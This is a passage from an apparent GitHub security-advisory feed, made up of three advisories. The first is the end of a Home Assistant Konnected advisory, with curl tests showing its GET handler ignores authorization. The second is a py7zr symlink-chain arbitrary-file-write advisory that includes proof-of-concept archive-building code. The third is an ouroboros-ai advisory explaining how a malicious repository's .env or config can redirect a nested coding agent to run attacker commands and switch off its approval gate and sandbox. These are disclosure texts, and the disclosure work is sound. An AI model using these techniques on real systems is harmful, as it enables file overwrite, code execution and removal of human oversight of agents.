2026-05-18 15:23:55.944 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #7). ...
2026-05-18 15:23:55.951 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #8). ...
2026-05-18 15:23:55.957 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #9). ...
2026-05-18 15:23:55.964 WARNING [custom_components.konnected_poc] panel.async_connect() invoked (attempt #10). ...
</code></pre>
<p>A sustained scan trivially fills the operator's panel side with retry storms. In production the call is an outbound HTTPS connection to the Konnected hardware on the LAN.</p>
<h4 id="step-6-the-authorization-header-is-ignored-on-get">Step 6: the Authorization header is ignored on GET</h4>
<p>Identical responses with no header, a deliberately wrong header, and no header again. This rules out any caching artifact and confirms <code>get()</code> never reads the auth state.</p>
<pre><code>$ curl -sS "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"
{"zone":"5","state":1}

$ curl -sS -H "Authorization: Bearer this-token-is-completely-wrong" \
    "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"
{"zone":"5","state":1}

$ curl -sS "http://127.0.0.1:8123/api/konnected/device/aabbccdd1122?zone=5"
{"zone":"5","state":1}
</code></pre>
<p>The wrong-Authorization case is the load-bearing one. If the GET handler ever consulted the header, it would either accept it (no, because the token is wrong) or reject it (no, because the response is 200 with state). The handler never reads <code>request.headers["Authorization"]</code>.</p>
<h4 id="step-7-startup-log-confirms-the-view-is-registered-and-the-integration-is-loaded">Step 7: startup log confirms the view is registered and the integration is loaded</h4>
<pre><code>2026-05-18 15:23:50.815 INFO (MainThread) [homeassistant.setup] Setting up konnected
2026-05-18 15:23:50.815 INFO (MainThread) [homeassistant.setup] Setup of domain konnected took 0.00 seconds
2026-05-18 15:23:50.850 INFO (MainThread) [homeassistant.setup] Setting up konnected_poc
2026-05-18 15:23:50.850 INFO (MainThread) [custom_components.konnected_poc] konnected_poc: registered KonnectedView and primed device aabbccdd1122
2026-05-18 15:23:50.850 INFO (MainThread) [homeassistant.setup] Setup of domain konnected_poc took 0.00 seconds
</code></pre>
<p>The <code>konnected</code> integration shipped in core 2026.5.2 is loaded normally. The <code>konnected_poc</code> shim runs after it, registering the same <code>KonnectedView</code> class through <code>hass.http.register_view</code> and seeding <code>hass.data[konnected][devices]</code> with a representative alarm-panel configuration. The bug surface is the same <code>KonnectedView</code> class the upstream integration registers at <code>__init__.py:248</code> on every production install.</p>
<h3 id="workaround">Workaround</h3>
<p>Migrate to the EspHome integration, as suggested in the existing repair issue for the Konnected integration.</p>
<h3 id="fix">Fix</h3>
<p>The Konnected integration was removed in Home Assistant Core 2026.6.0. It had been deprecated for some time.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/home-assistant/core/security/advisories/GHSA-x84v-g949-293w">https://github.com/home-assistant/core/security/advisories/GHSA-x84v-g949-293w</a></li>
<li><a href="https://github.com/advisories/GHSA-x84v-g949-293w">https://github.com/advisories/GHSA-x84v-g949-293w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x84v-g949-293w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T19:35:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[py7zr] py7zr: Arbitrary File Write Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-q6rc-2cgv-63h7</id>
        <link href="https://github.com/advisories/GHSA-q6rc-2cgv-63h7"/>
        <updated>2026-06-19T19:21:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There exists an <strong>arbitrary file write vulnerability</strong> in <code>py7zr</code> (1.1.0, latest), which allows symbolic links to be recreated outside the destination directory via crafted malicious symbolic link chains. When using <code>extractall</code> to extract an archive, the library restores these symbolic links, linking them to arbitrary directories on the host file system. Subsequent extraction of regular files through these symbolic links can result in arbitrary file writes. This vulnerability may lead to remote code execution, privilege escalation, data corruption, or denial of service.</p>
<h3 id="details">Details</h3>
<p>The root cause of this vulnerability is that <code>py7zr</code> fails to properly restrict the targets of symbolic links within an archive. During extraction, the program only checks the link arcname within the destination directory, but ignores the combined symlink path resolution. Attackers can exploit this vulnerability by constructing malicious archives, thereby bypassing the directory boundary restrictions implemented by the extractor.</p>
<img width="1806" height="834" alt="image" src="https://github.com/user-attachments/assets/cdd27ddb-ba79-4b20-b8b9-21f3e16a6e8b">


<h3 id="poc">PoC</h3>
<h4 id="construct-poc-archive-file"><strong>Construct PoC Archive File</strong></h4>
<p>The following pseudo-code illustrates the vulnerable logic.</p>
<pre><code class="language-python">def create_sevenz_exp(output_dir: str):
    filename = "archive.7z"
    file_path = output_dir + filename
    with py7zr.SevenZipFile(file_path, 'w') as archive:
        archive.writestr("Some Text", "dir0/someFile.txt")
        add_symlink(archive, "dir1", "dir0/..")
        add_symlink(archive, "dir2", "dir1/..")
        add_symlink(archive, "dir3", "dir2/..")
        add_symlink(archive, "dir4", "dir3/..")
        add_symlink(archive, "dir5", "dir4/..")
        add_symlink(archive, "dir6", "dir5/..")
        add_symlink(archive, "dir7", "dir6/..")
        add_symlink(archive, "dir8", "dir7/..")
        add_symlink(archive, "myTmp", "dir8/tmp")
        archive.writestr("Malicious Text\n", "myTmp/poc.txt")
</code></pre>
<h4 id="unpack-the-archive"><strong>Unpack the archive</strong></h4>
<p>Use common decompression methods, then extract the archive.</p>
<pre><code class="language-python">import sys
import os
import py7zr

def extract_7z(seven_path, output_dir):
    os.makedirs(output_dir, exist_ok=True)
    with py7zr.SevenZipFile(seven_path, mode='r') as z:
        z.extractall(path=output_dir)
    print(f"Extracted '{seven_path}' to '{output_dir}'")

if __name__ == "__main__":
    seven_file = sys.argv[1]
    base_name = os.path.splitext(os.path.basename(seven_file))[0]
    output = base_name + "_sevenz_output"

    extract_7z(seven_file, output)
</code></pre>
<h3 id="impact">Impact</h3>
<img width="1268" height="572" alt="image" src="https://github.com/user-attachments/assets/919b5ff6-97ba-4781-b3e4-e9c9cc0f229b">

<p>After decompression, the <code>output</code> directory contains a sequence of symbolic links, which can finally point to the system root directory. Then, when extracting a regular file, the file will be written to an arbitrary path.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/miurahr/py7zr/security/advisories/GHSA-q6rc-2cgv-63h7">https://github.com/miurahr/py7zr/security/advisories/GHSA-q6rc-2cgv-63h7</a></li>
<li><a href="https://github.com/miurahr/py7zr/releases/tag/v1.1.3">https://github.com/miurahr/py7zr/releases/tag/v1.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-q6rc-2cgv-63h7">https://github.com/advisories/GHSA-q6rc-2cgv-63h7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q6rc-2cgv-63h7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T19:21:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ouroboros-ai] ouroboros-ai: Incomplete fix of CVE-2026-47211: untrusted project .env can still reach RCE via omitted execution-routing keys]]></title>
        <id>https://github.com/advisories/GHSA-jv2h-4p9v-wf5w</id>
        <link href="https://github.com/advisories/GHSA-jv2h-4p9v-wf5w"/>
        <updated>2026-06-19T15:12:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The CVE-2026-47211 fix (0.39.0) added <code>_UNTRUSTED_ENV_DENYLIST</code> to stop an untrusted project-directory <code>.env</code> from redirecting execution. The denylist was incomplete — several execution-routing keys of the same RCE class were omitted, so a malicious cloned repo can still reach arbitrary command execution by shipping a <code>.env</code> (auto-loaded at import, no review step):</p>
<ul>
<li><strong>Backend config-home roots</strong> <code>CODEX_HOME</code>, <code>OPENCODE_CONFIG</code>, <code>OPENCODE_CONFIG_DIR</code>, <code>XDG_CONFIG_HOME</code>: a spawned vendor CLI resolves its config from these. <code>CODEX_HOME=./.evil</code> + committed <code>./.evil/config.toml</code> redirects the nested Codex agent to attacker config — <code>mcp_servers.&lt;name&gt;.command/args</code> (RCE) and <code>approval_policy="never"</code> / <code>sandbox_mode="danger-full-access"</code> (silent removal of the human approval gate). (reported by matte1782)</li>
<li><strong>MCP bridge / plugin execution roster</strong> <code>OUROBOROS_MCP_CONFIG</code> (the YAML's server <code>command</code>/<code>args</code> are spawned via stdio_client — RCE), <code>OUROBOROS_PLUGIN_LOCKFILE</code>, <code>OUROBOROS_PLUGIN_TRUST_ROOT</code> (redirect the installed-plugin roster / trust root so <code>ooo &lt;name&gt;</code> dispatches into attacker code). (reported by hackkim)</li>
<li><strong>SSRF guard toggle</strong> <code>OUROBOROS_ALLOW_LOCAL_TRANSPORT</code> (re-enables loopback/private MCP transport targets).</li>
<li><strong>Instruction / capability roots</strong> <code>OUROBOROS_AGENTS_DIR</code>, <code>COPILOT_CUSTOM_INSTRUCTIONS_DIRS</code> (replace spawned sub-agent role prompts), <code>OUROBOROS_RUNTIME_PROFILE</code> (backend selector), <code>OUROBOROS_TOOL_CAPABILITIES</code> (override YAML can lower a tool's <code>approval_class</code>, weakening the approval gate).</li>
</ul>
<p>Additionally, the MCP bridge auto-loaded <code>./.ouroboros/mcp_servers.yaml</code> from the working directory (<code>create_bridge_from_env(cwd=Path.cwd())</code>), so running <code>ooo</code> inside a malicious repo spawned the committed roster's <code>command</code> — RCE with no <code>.env</code> at all. (cwd-branch noted by hackkim)</p>
<h3 id="patches">Patches</h3>
<p>Fixed in 0.42.1. All listed keys were added to <code>_UNTRUSTED_ENV_DENYLIST</code>; the cwd auto-discovery branch was removed (only the explicit <code>OUROBOROS_MCP_CONFIG</code> env var and <code>~/.ouroboros/mcp_servers.yaml</code> remain, both trusted). The regression suite now derives from the source denylist to prevent future drift.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not run Ouroboros from an untrusted/cloned repository directory; remove any project-directory <code>.env</code> and <code>./.ouroboros/mcp_servers.yaml</code> before running.</p>
<h3 id="credit">Credit</h3>
<p>Reported privately via coordinated disclosure by matte1782 and hackkim (<a href="https://github.com/hackkim">https://github.com/hackkim</a>).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Q00/ouroboros/security/advisories/GHSA-jv2h-4p9v-wf5w">https://github.com/Q00/ouroboros/security/advisories/GHSA-jv2h-4p9v-wf5w</a></li>
<li><a href="https://github.com/advisories/GHSA-jv2h-4p9v-wf5w">https://github.com/advisories/GHSA-jv2h-4p9v-wf5w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jv2h-4p9v-wf5w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T15:12:25.000Z</published>
    </entry>
</feed>